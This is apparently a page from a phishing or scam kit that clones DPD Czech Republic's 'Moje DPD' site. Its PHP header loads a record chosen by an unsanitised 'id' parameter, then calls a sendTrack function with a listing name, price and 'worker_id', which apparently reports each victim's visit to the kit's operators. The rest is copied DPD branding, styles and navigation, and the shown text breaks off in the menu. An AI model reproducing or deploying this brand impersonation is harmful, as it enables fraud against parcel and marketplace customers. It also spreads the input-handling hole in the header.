
<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<html class="fontawesome-i2svg-active fontawesome-i2svg-complete" style="--rf-chat-user-message-color:#FFFFFF; --rf-chat-user-message-background-color:#808285; --rf-chat-bot-basic-message-color:#414042; --rf-chat-bot-basic-message-background-color:#E6E7E8; --rf-chat-bot-alert-message-background-color:#FFFFFF; --rf-chat-bot-alert-message-color:#414042; --rf-chat-background-color:#CAC4BE; --rf-chat-header-color:#A90034;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Aplikace Moje DPD usnadňuje objednání přepravy | DPD</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="description" content="Moje DPD vám poskytuje kompletní kontrolu nad přepravou vašich zásilek s DPD. Slouží především k objednání přepravy a tisku přepravních štítků.">
<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
<style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="canonical" href="https://www.dpd.com/cz/cs/moje-dpd/">
<meta property="og:locale" content="cs_CZ">
<meta property="og:type" content="article">
<meta property="og:title" content="Aplikace Moje DPD usnadňuje objednání přepravy | DPD">
<meta property="og:description" content="Moje DPD vám poskytuje kompletní kontrolu nad přepravou vašich zásilek s DPD. Slouží především k objednání přepravy a tisku přepravních štítků.">
<meta property="og:url" content="https://www.dpd.com/cz/cs/moje-dpd/">
<meta property="og:site_name" content="DPD Czech Republic">
<meta property="article:publisher" content="https://www.facebook.com/dpd.cz/">
<meta property="article:modified_time" content="2022-03-02T16:45:23+00:00">
<meta property="og:image" content="/logoprev.png">
<meta property="fb:app_id" content="https://www.facebook.com/dpd.cz/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Aplikace Moje DPD usnadňuje objednání přepravy | DPD">
<meta name="twitter:description" content="Moje DPD vám poskytuje kompletní kontrolu nad přepravou vašich zásilek s DPD. Slouží především k objednání přepravy a tisku přepravních štítků.">
<link rel="stylesheet" id="fvm-header-0-css" href="./pop_files/header-49c8535f-1644388977.min.css" type="text/css" media="all">

<title>WebApp</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<body class="page-template-default page page-id-22 page-parent siteorigin-panels">
<div class="container">
<header class="row-fix-margin-auto justify-content-between sticky-header border-bot-none is_stuck" style="position: fixed; top: 0px; width: 1435px;">
<nav class="navbar mainnavbar padding-header col-12 col-sm-12 col-md-12 pb-0 navbar-expand-md">
<a class="navbar-brand" href="https://www.dpd.com/cz/cs/"><img src="./pop_files/DPD_logo_redgrad_rgb_responsive.svg" class="size-icon-logo" alt=""></a>
<div class="collapse navbar-collapse" id="navbarNav">
<ul class="navbar-nav d-md-none d-lg-flex font-light">
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/cz/cs/poslat-balik/"><span>Poslat balík</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" style="border-bottom: 1px solid #e6e7e8" href="?page_id=20#registrovany_zakaznik">
<span>Registrovaný zákazník</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" style="border-bottom: 1px solid #e6e7e8" href="?page_id=20#neregistrovany_zakaznik">
<span>Neregistrovaný zákazník</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/poslat-balik/mezinarodni-preprava/">
<span>Mezinárodní přeprava</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/poslat-balik/pro-eshopy/">
<span>Pro e-shopy</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/poslat-balik/vraceni-zasilky/">
<span>Vrácení zásilky</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/cz/cs/cekam-balik/"><span>Čekám balík</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/tracking/(lang)/cs_CZ">
<span>Sledování balíku</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/">
<span>Výdejní místa Pickup</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/cekam-balik/dpd-kuryr/">
<span>DPD Kurýr</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/cekam-balik/boxy/">
<span>DPD boxy</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/cz/cs/o-nas/"><span>O nás</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/cz/cs/o-nas/pro-media/">
<span>Pro média</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/cz/cs/o-nas/inovace/">
<span>Inovace</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/cz/cs/o-nas/nase-sluzby/">
<span>Naše služby</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/">
<span>Společenská odpovědnost</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://www.dpd.com/cz/cs/o-nas/kariera/">
<span>Kariéra</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/kontakt/">
<span>Kontakt</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/cz/cs/dpdshipping/"><span>DPD Shipping</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/dpdshipping/">
<span>Více o aplikaci DPD Shipping</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://shipping.dpdgroup.com/login">
<span>Přihlásit se do aplikace DPD Shipping</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-22 current_page_item">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/cz/cs/moje-dpd/"><span>Moje DPD</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://www.mojedpd.cz/IT4EMWeb/Login.html?locale=cs">
<span>Přihlásit se do Moje DPD</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/moje-dpd/videa/">
<span>Instruktážní videa k Moje DPD</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/cz/cs/podpora/"><span>Podpora</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/cz/cs/podpora/nejcastejsi-dotazy/">
<span>Nejčastější dotazy</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/cz/cs/podpora/aktualni-informace/">
<span>Aktuální informace</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/cz/cs/podpora/podminky-prepravy/">
<span>Podmínky přepravy</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/podpora/aplikace-a-nastroje/">
<span>Aplikace a nástroje</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/podpora/reklamace/">
<span>Reklamace</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/podpora/dokumenty-ke-stazeni/">
<span>Dokumenty ke stažení</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
</ul>
</div>
<form action="https://www.dpd.com/cz/cs/" id="search-desktop" method="GET">
<div class="input-box search-box wide-search-box d-none d-md-block l-search header-search right-search-header">
<input type="text" name="s" class="text-search-box text-box pt-1 font-light" placeholder="Co hledáte?" value="">
<i class="input-icon"><img src="./pop_files/magnifier.svg" alt=""></i>
<span class="search-close"><img src="./pop_files/x-black.svg" alt=""></span>
</div>
</form>
<form action="https://www.dpd.com/cz/cs/" id="search-mobile" method="GET">
<div class="mobile-search input-box search-box wide-search-box d-block d-md-none l-search">
<img class="mobile-search-close search-close" src="./pop_files/close-x-big-blk.svg" alt="">
<h3 class="font-light text-center">Co hledáte?</h3>
<input type="text" name="s" class="text-search-box font-light col-10 offset-1" placeholder="Co hledáte?" value="">
<i class="input-icon"><img src="./pop_files/magnifier.svg" alt=""></i>
<span class="clear-text"><img src="./pop_files/x-black.svg" alt=""></span>
<div class="search-term-wrap-mobile">
</div>
</div>
</form>
<span class="offmenu-toggle"><img src="./pop_files/burger-menu.svg" alt=""></span>
</nav>
<div class="container">
<div class="holder-menu-wrapper"><div class="holder-menu active" style="padding-left: 159px;"><div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://www.mojedpd.cz/IT4EMWeb/Login.html?locale=cs">
<span>Přihlásit se do Moje DPD</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/moje-dpd/videa/">
<span>Instruktážní videa k Moje DPD</span>
</a>
</div>
</div>
</div>
</div>
</div><div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" href="https://www.mojedpd.cz/IT4EMWeb/Login.html?locale=cs">
<span>Přihlásit se do Moje DPD</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/moje-dpd/videa/">
<span>Instruktážní videa k Moje DPD</span>
</a>
</div>
</div>
</div>
</div>
</div></div></div>
</div>
</header><div style="position: relative; width: 1419px; height: 106.891px; display: block; vertical-align: baseline; float: none;"></div>
<div class="nav-bg-hover"></div>
<div class="offcanvas-wrap">
<div class="offcanvas-menu">
<div class="offcanvas-header vertical-align py-3 py-md-4 px-3">
<span class="special-text font-light light-color">Menu</span>
<span class="offcanvas-close">
<img class="d-none d-md-inline" src="./pop_files/x-white.svg">
<img class="d-inline d-md-none" src="./pop_files/navibar_mobile.png">
</span>
</div>
<div class="offcanvas-content d-none d-lg-block">
<ul class="burger-menu-desktop font-light">
<li class="  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/cekam-balik/" class="active">Čekám balík</a> </li>
<li class="  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/poslat-balik/" class="active">Poslat balík</a> </li>
<li class="has-sub  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/" class="active">Výdejní místa</a><i class="sub-expand active"></i> <ul class="sub opened">
<li><a class=" menu-item menu-item-type-custom menu-item-object-custom" href="http://pickup.dpd.cz/">Najít výdejní místo</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/chci-se-stat-vydejnim-mistem/">Stát se výdejním místem</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/cekam-balik/boxy/">DPD boxy</a></li>
</ul>
</li>
<li class="has-sub  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/" class="active">Společenská odpovědnost</a><i class="sub-expand active"></i> <ul class="sub opened">
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/zijeme-pro-nasi-spolecnost/">Žijeme pro naší společnost</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/uhlikove-neutralni-preprava/">Emise CO2 snižujeme na nulu</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/dorucujeme-s-citem/">Ve městech doručujeme s citem</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/prichazime-s-inovacemi/">Přicházíme s inovacemi</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/vyhledavany-zamestnavatel/">Vyhledávaný zaměstnavatel</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/monitorovani-kvality-ovzdusi/">Program monitorování kvality ovzduší</a></li>
</ul>
</li>
<li class="has-sub  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/podpora/aktualni-informace/" class="active">Aktuální informace</a><i class="sub-expand active"></i> <ul class="sub opened">
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/brexit/">Brexit</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/e-shopper-barometer/">E-shopper Barometer 2020</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/koronavirus/">Koronavirus</a></li>
</ul>
</li>
<li class="  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/podpora/nejcastejsi-dotazy/" class="active">Nejčastější dotazy</a> </li>
<li class="has-sub  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/o-nas/kariera/" class="active">Kariéra</a><i class="sub-expand active"></i> <ul class="sub opened">
<li><a class=" menu-item menu-item-type-custom menu-item-object-custom" href="https://kariera.dpd.cz/">Aktuální pracovní pozice</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/kariera/benefity/">Benefity</a></li>
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/kariera/age-management/">Age management</a></li>
</ul>
</li>
<li class="  menu-item menu-item-type-custom menu-item-object-custom"><a href="https://www.dorucujprodpd.cz/" class="active">Dopravci &amp; Kurýři</a> </li>
<li class="has-sub  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/o-nas/" class="active">O nás</a><i class="sub-expand active"></i> <ul class="sub opened">
<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/pro-media/">Pro média</a></li>
